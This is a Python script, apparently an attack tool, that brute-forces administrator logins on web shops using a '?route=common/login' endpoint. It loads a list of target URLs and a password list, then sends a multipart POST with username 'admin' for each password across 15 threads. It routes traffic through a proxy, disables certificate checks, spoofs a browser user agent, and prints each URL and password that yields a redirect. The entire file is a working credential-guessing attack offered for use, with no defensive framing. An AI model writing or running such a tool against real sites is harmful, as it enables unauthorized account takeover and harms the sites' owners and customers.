#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
import requests
from socket import *
import time
from random import randrange
from queue import Queue
# from multiprocessing import Queue
from threading import Thread
from requests.exceptions import HTTPError
from hashlib import md5
import logging
from OpenSSL import crypto
from requests import pyopenssl as reqs
import re
import urllib3

logpath = "./alive.txt"
ch = logging.FileHandler(logpath)
logger = logging.getLogger('log')
logger.setLevel(logging.INFO)
logger.addHandler(ch)

THREADS_COUNT = 15

proxies = {'http': '192.168.0.180:8080', 'https': '192.168.0.180:8080'}


def get_user_agent():
    user_agent = {
        'User-agent': '"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Safari/605.1.15'}
    return user_agent


def main():
    setdefaulttimeout(15)
    q = Queue(maxsize=0)

    with open("./alive.txt") as ip:
        target = [line.rstrip('\n') for line in ip]

        for i in range(len(target)):
            with open("./password.txt") as txtpass:
                password = [line.rstrip('\n') for line in txtpass]
                for x in range(len(password)):
                    q.put_nowait((i, target[i], password[x]))

    start_thread(q)


def start_thread(q):
    for i in range(THREADS_COUNT):
        worker = Thread(target=processor, args=(q,))
        worker.setDaemon(True)
        worker.start()
    q.join()


def processor(q, ):
    while not q.empty():
        item = q.get_nowait()
        apply_payload(q, item[1], item[2])
        q.task_done()
    return True


def apply_payload(q, session_url, password):
    session = requests.Session()

    headers = {"Content-Type": "multipart/form-data; boundary=---------------------------17737196181685115719725552597"}
    payload = "-----------------------------17737196181685115719725552597\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\nadmin\r\n-----------------------------17737196181685115719725552597\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n{}\r\n-----------------------------17737196181685115719725552597--".format(
        password)
    session.headers.update(get_user_agent())

    try:
        response = session.post(session_url + "?route=common/login", data=payload, headers=headers, proxies=proxies,
                                timeout=7, allow_redirects=False, verify=False)
        if response.status_code == 302:
            print("[+] {} // password: {}".format(session_url, password))
    except:
        pass


if __name__ == '__main__':
    urllib3.disable_warnings()
    sys.exit(main())
